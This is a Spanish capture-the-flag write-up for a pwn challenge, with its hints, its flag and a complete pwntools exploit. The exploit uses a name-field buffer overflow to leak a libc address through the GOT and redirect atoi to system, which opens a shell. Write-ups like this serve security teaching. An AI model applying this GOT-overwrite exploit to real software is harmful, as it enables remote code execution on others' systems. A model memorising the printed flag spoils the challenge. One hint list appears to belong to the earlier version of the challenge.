# Tito Klecko's Storage 2
- **Categoría:** Pwn
- **Dificultad:** ★★★★☆
- **Autor:** [Klecko](https://twitter.com/klecko0)

### Descripción
¡Bienvenido al almacén del tito Klecko!
¿Tú otra vez? Tranquilo, esta vez no hay flag guardada… ¡para ti!

Nota: el uso de la librería de python [pwntools](https://github.com/Gallopsled/pwntools/) para [interactuar](http://docs.pwntools.com/en/latest/intro.html#making-connections) con el proceso o con el servidor remo-to está altamente recomendado.

### Hints
1. El buffer overflow te permite crear items falsos en memoria. 
2. Necesitas aprender sobre la Global Offset Table (GOT). [Este](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html) puede ser un buen recurso.
3. La GOT te puede ayudar a obtener un leak de la libc y vencer así ASLR.


### Hints
1. ¿No habrá alguna manera de modificar el tipo de un item para que sea de tipo *ITEM_WIN*?
2. ¡Buffer overflow al modificar el nombre!
3. Puedes sobreescribir el primer item.

### Flag
``CTFUni{m4st3r_0f_pwn!!!11}``  
<br>

## Writeup
En esta nueva versión del reto se ha eliminado el tipo ITEM_WIN, pero sigue habiendo un overflow del nombre en los items. Esto permite que un atacante cree items arbitrarios. Creando un item de tipo string con un puntero arbitrario podemos leer y modificar dicho puntero.  

El exploit crea un item de tipo string, poniendo el puntero a una entrada de la Global Offset Table (GOT), y lo imprime para obtener un leak de la libc. A continuación, modifica dicho item con la dirección de la función `system`.  

Ya que la entrada de la GOT que estamos modificando es la de la función `atoi`, ahora cuando se llame a `atoi(input)` se llamará a `system(input)`. Por tanto, enviar de entrada `/bin/sh` ejecuta una shell.

El exploit hace uso de pwntools para interactuar con el proceso en local o con el socket en remoto, y para calcular automáticamente los offsets con el uso de objetos ELF. Es posible hacerlo sin objetos ELF, hardcodeando los offsets de la libc necesarios para el cálculo de la dirección de `system` a partir del leak. También se puede hacer sin pwntools usando directamente sockets, pero es más engorroso.

Requiere conocimientos de la GOT para redirigir el flujo de ejecución del programa. También requiere conocimientos de scripting: interactuar con un proceso o un socket, conversiones de número a bytes en little endian y viceversa.

```python
#!/usr/bin/env python3
from pwn import *

REMOTE = True
elf = ELF("./items2") # this must be run from the same folder as the binary
libc = ELF("./libc.so.6")
context.binary = elf
context.terminal = ["x-terminal-emulator", "-e"]

if REMOTE:
	p = remote("localhost", 7002)
else:
	p = process(elf.path)
	# attach(p, "continue")

p.sendlineafter(b"name:", b"klecko")

# change name, overflow and create a string with pointer to a GOT entry
p.sendlineafter(b"> ", b"4")
payload = b"A"*32 + p64(2) + p64(elf.got.atoi)
p.sendlineafter(b"name:", payload)

# print contents of GOT entry and get leak
p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"Index:", b"0")
p.recvuntil(b"Data: ")
leak = p.recvline()[:-1]
print(hexdump(leak))
atoi = u64(leak + b"\x00"*2)
libc.address = atoi - libc.symbols.atoi
print(hex(libc.address))

# overwrite contents of GOT with system
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Index:", b"0")
p.sendlineafter(b"String:", p64(libc.symbols.system))

# now atoi(input) will actually call system(input).
# trigger shell sending /bin/sh
p.sendlineafter(b"> ", b"/bin/sh")

p.interactive()
```

<br>

